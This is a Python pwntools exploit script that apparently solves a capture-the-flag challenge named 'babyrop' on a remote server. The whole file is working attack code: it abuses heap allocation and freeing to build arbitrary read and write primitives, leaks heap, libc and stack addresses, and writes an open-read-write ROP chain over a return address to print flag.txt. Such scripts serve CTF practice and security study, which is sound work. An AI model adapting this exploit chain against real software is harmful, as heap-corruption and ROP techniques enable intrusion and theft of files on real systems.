from pwn import *

elf = ELF('./babyrop')
libc = ELF('./libc.so.6')
# p = elf.process()
p = remote('mc.ax', 31245)

def create(idx, str_len, payload = b'a'):
	p.sendlineafter(b': ', b'C')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))
	p.sendlineafter(b': ', str(str_len).encode('utf-8'))
	p.sendlineafter(b': ', payload)

def free(idx):
	p.sendlineafter(b': ', b'F')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))

def view(idx):
	p.sendlineafter(b': ', b'R')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))

def edit(idx, payload):
	p.sendlineafter(b': ', b'W')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))
	p.sendlineafter(b': ', payload)

def arb_read(addr):
	edit(4, p64(0x100) + p64(addr))
	view(1)
	p.recvline()
	a = p.recvline().strip().split(b' ')
	return int(b''.join(a[i] for i in range(5, -1, -1)), 16)

def arb_write(addr, payload):
	edit(4, p64(0x100) + p64(addr))
	edit(1, payload)

create(0, 10000000)

create(1, 0x18)
free(1)
create(1, 0x20)

create(2, '+')
view(2)
p.recvuntil(b'Sending ')

heap_base = (int(p.recvuntil(b' ')[:-1]) << 12) - 0x1000*2
log.info('heap_base: ' + hex(heap_base))

p.recvuntil(b'enter')
create(3, 0x18)

free(1)
free(3)

create(3, 0x20)
create(4, 0x18, p64(0x100) + p64(heap_base + 0x22c8))

libc.address = arb_read(elf.got['puts']) - libc.sym['puts']
log.info('libc.address: ' + hex(libc.address))

stack_leak = arb_read(libc.sym['environ'])
log.info('stack_leak: ' + hex(stack_leak))

return_addr = stack_leak - 0x140

syscall_ret = libc.address + 0x888f2
pop_rdi = libc.address + 0x2d7dd
pop_rsi = libc.address + 0x2eef9
pop_rdx = libc.address + 0xd9c2d
pop_rax = libc.address + 0x448a8
flag_path = return_addr + 0xc8

payload = p64(pop_rdi)
payload += p64(flag_path)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall_ret)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(flag_path)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(flag_path)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret)
payload += b'flag.txt\x00'

arb_write(return_addr, payload)

p.recv()
p.sendline(b'E')

p.recv()
p.sendline(b'0')

p.interactive()